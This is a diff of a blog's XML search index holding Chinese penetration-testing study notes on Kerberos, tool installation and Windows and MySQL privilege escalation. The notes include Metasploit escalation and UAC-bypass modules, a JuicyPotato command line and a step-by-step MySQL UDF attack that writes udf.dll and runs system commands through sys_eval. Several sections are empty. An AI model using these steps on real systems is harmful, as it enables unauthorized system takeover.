+<h1 id="ntlm协议"><a href="#ntlm协议" class="headerlink" title="ntlm协议"></a>ntlm协议</h1><p><a href="https://www.istt.org.cn/NewsDetail/2031875.html">Windows认证原理 网络认证(进阶篇)-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p>
+<h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>Kerberos是一种由MIT提出的一种计算机网络授权协议，旨在通过使用加密技术为客户端/服务端应用程序提供强大的认证服务。</p>
+<p>Kerberos 主要是用在域环境下的身份认证协议。</p>
+<p><img src="/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/image-20220124122003434.png" alt="image-20220124122003434"></p>
+<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>参考：</p>
+<p><a href="https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA">https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA</a></p>
+<p><a href="https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA">https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA</a></p>
+<p><a href="https://www.istt.org.cn/NewsDetail/2031879.html">Windows认证原理 Kerberos认证-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p>
+<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="DCsync"><a href="#DCsync" class="headerlink" title="DCsync"></a>DCsync</h1>]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网知识学习</tag>
       </tags>
   </entry>
   <entry>
@@ -1285,12 +1330,138 @@
 <p>下面执行</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; use arl</span><br><span class="line">switched to db arl</span><br><span class="line">&gt; db.user.drop()</span><br><span class="line">true</span><br><span class="line">&gt; db.user.insert(&#123;username: &#39;admin&#39;, password: hex_md5(&#39;arlsalt!@#&#39;+&#39;admin123&#39;)&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt; exit</span><br><span class="line">bye</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用admin&#x2F;admin123登陆</span><br></pre></td></tr></table></figure>
 
+
+
+
+
+<h3 id="freenom-cloudflare"><a href="#freenom-cloudflare" class="headerlink" title="freenom+cloudflare"></a>freenom+cloudflare</h3><p>freenom:<a href="https://www.freenom.com/zh/index.html?lang=zh">https://www.freenom.com/zh/index.html?lang=zh</a></p>
+<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170459840.png" alt="image-20220127170459840"></p>
+<p>cloudflare:<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p>
+<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170605260.png" alt="image-20220127170605260"></p>
+<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170626202.png" alt="image-20220127170626202"></p>
+<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127171635729.png" alt="image-20220127171635729"></p>
+<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="[Impacket ]"></a>[Impacket ]</h3><p>介绍：<a href="https://www.cnblogs.com/backlion/p/10676339.html">https://www.cnblogs.com/backlion/p/10676339.html</a></p>
+<p>安装方法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;CoreSecurity&#x2F;impacket.git</span><br><span class="line"></span><br><span class="line">cd impacket&#x2F;</span><br><span class="line"></span><br><span class="line">python setup.py install</span><br><span class="line"></span><br><span class="line">cd impacket&#x2F;examples</span><br><span class="line">工具都在这个目录里impacket&#x2F;examples</span><br></pre></td></tr></table></figure>
+
+<p>打内网里面很多py还是很方便的</p>
 ]]></content>
       <categories>
         <category>工具</category>
       </categories>
       <tags>
         <tag>工具安装记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>提权</title>
+    <url>/2022/01/16/%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<p>[toc]</p>
+<span id="more"></span>
+
+<h1 id="windows-提权"><a href="#windows-提权" class="headerlink" title="windows 提权"></a>windows 提权</h1><hr>
+<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>汇总：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<h5 id="提权辅助"><a href="#提权辅助" class="headerlink" title="提权辅助"></a>提权辅助</h5><p>systeminfo   查看补丁</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221104049104.png" alt="image-20220221104049104"></p>
+<p><a href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a> 寻找提权漏洞，github下载，但提权exe需要经过免杀测试 </p>
+<p><a href="https://github.com/Ascotbe/Kernelhub">Windows提权漏洞合集</a></p>
+<h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><ol>
+<li>该模块能够查询安装补丁</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221103405151.png" alt="image-20220221103405151"></p>
+<ol start="2">
+<li>低权限用户的session，该模块用于快速识别系统中可能被利用的漏洞，进行提权</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221112230097.png" alt="image-20220221112230097"></p>
+<p>根据显示可利用的模块，进行提权（感觉可以）</p>
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221131823569.png" alt="image-20220221131823569"></p>
+<h3 id="bypassUAC"><a href="#bypassUAC" class="headerlink" title="bypassUAC"></a>bypassUAC</h3><p>用户帐户控制 (UAC)  允许所有用户使用标准用户帐户登录到他们的计算机。 使用标准用户令牌启动的进程可能会使用授予标准用户的访问权限执行任务。借助 UAC，应用和任务将始终在非管理员帐户的安全上下文中运行，除非管理员专门授予管理员级别的访问系统权限。 UAC 可阻止自动安装未经授权的应用并防止意外更改系统设置。</p>
+<p>总之来说就是绕过uac限制，运行某些程序，对c盘一些重要文件进行读取和写入，安装卸载程序等</p>
+<p>适用于：</p>
+<ul>
+<li>Windows 10，Windows 11，Windows Server 2016 和更高版本</li>
+</ul>
+<h5 id="msf-1"><a href="#msf-1" class="headerlink" title="msf:"></a>msf:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221133213351.png" alt="image-20220221133213351"></p>
+<p>参考：<a href="https://mp.weixin.qq.com/s/vowFqYxX_x0gu2-38TEGFA">https://mp.weixin.qq.com/s/vowFqYxX_x0gu2-38TEGFA</a></p>
+<h5 id="dll注入"><a href="#dll注入" class="headerlink" title="dll注入"></a>dll注入</h5><h5 id="白名单进程"><a href="#白名单进程" class="headerlink" title="白名单进程"></a>白名单进程</h5><h3 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a>土豆家族</h3><p>Juicy Potato：<a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
+<p>原理：</p>
+<p>实际上就是利用MS16-075漏洞进行提权</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;8BC3F05E-D86B-11D0-A075-00C04FB68820&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220219151053814.png" alt="image-20220219151053814"></p>
+<p>条件：</p>
+<ol>
+<li>用户权限：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line"></span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br><span class="line"></span><br><span class="line">如果均开启，可以选择-t *</span><br><span class="line">如果均未开启，那么无法提权</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>RPC 135端口是否开启</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;66y_Pg2j9CNfxeErFczdSg</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;lmfM6VWM3YXj2vjalNerKw</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;blog.cfyqy.com&#x2F;article&#x2F;bde10ad7.html#more</span><br><span class="line"></span><br><span class="line"># linux 提权</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### suid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### sudo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># mysql提权</span><br><span class="line"></span><br><span class="line">### udf </span><br><span class="line"></span><br><span class="line">原理：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>UDF是mysql的一个扩展接口，即扩展mysql的用户自定义函数。用户可以向mysql的udf.dll中添加用户自定义函数（可以执行命令的函数，如sys_eval（）），即可获得system权限。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">条件：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ol>
+<li>mysql用户(root)的密码，（查询，破解hash）</li>
+<li>secure_file_priv的值为空，具有写入权限，<br>如果mysql服务器开启了secure-file-priv选项，就只能将文件导出到指定目录下</li>
+</ol>
+<p>dll位置：<br>mysql版本&gt;=5.1 dll文件导入lib\plugin目录<br>5.0&lt;mysql版本&lt;5.1 dll文件导入c:\windows或者c:\windows\system32目录下</p>
+<p>mysql版本&lt;4.1  任意位置<br>4.1&lt;=mysql版本&lt;5.0</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看mysql的版本</span><br><span class="line"></span><br><span class="line">![](提权&#x2F;57.png)</span><br><span class="line"></span><br><span class="line">查看&#96;secure_file_priv&#96;的值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>show global variables like ‘secure%’;</p>
+<p>当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权</p>
+<p>当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权</p>
+<p>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;58.png)</span><br><span class="line"></span><br><span class="line">此处&#96;secure_file_priv&#96;的值为空，符合提权的要求</span><br><span class="line"></span><br><span class="line">查看&#96;plugin&#96;的目录名称</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>show variables like ‘plugin%’;</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;59.png)</span><br><span class="line"></span><br><span class="line">查询目录的绝对路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>select @@plugin_dir;</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;60.png)</span><br><span class="line"></span><br><span class="line">查看系统架构</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>show variables like ‘%compile%’;</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;61.png)</span><br><span class="line"></span><br><span class="line">可以看到该主机是64位的</span><br><span class="line"></span><br><span class="line">接下来将udf.dll文件写入plugin目录，并创建函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>select 0x十六进制内容 into dumpfile “plugin的目录\udf.dll”</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">把桌面上的tools文件夹中的udf.txt里面的十六进制内容写入&#96;C:\Program Files\MySQL\MySQL Server 5.5\lib\plugin\udf.dll&#96;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>select 0x4D5A90000300000 …… into dumpfile ‘C:\Program Files\MySQL\MySQL Server 5.5\lib\plugin\udf.dll’;</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;62.png)</span><br><span class="line"></span><br><span class="line">![](提权&#x2F;63.png)</span><br><span class="line"></span><br><span class="line">成功将udf.dll写入目标路径</span><br><span class="line"></span><br><span class="line">导入udf函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>create function sys_eval returns string soname ‘udf.dll’;    # 导入sys_eval函数</p>
+<p>select * from mysql.func where name = ‘sys_eval’;   # 查看创建的sys_eval函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;64.png)</span><br><span class="line"></span><br><span class="line">执行系统命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>select sys_eval(‘whoami’);</p>
+<p>select sys_eval(‘ipconfig’);</p>
+<pre><code>
+![](提权/65.png)
+
+成功获取system权限
+
+
+### mof
+
+
+
+
+
+
+
+
+
+# mssql提权
+
+### xp_cmdshell
+</code></pre>
+]]></content>
+      <categories>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
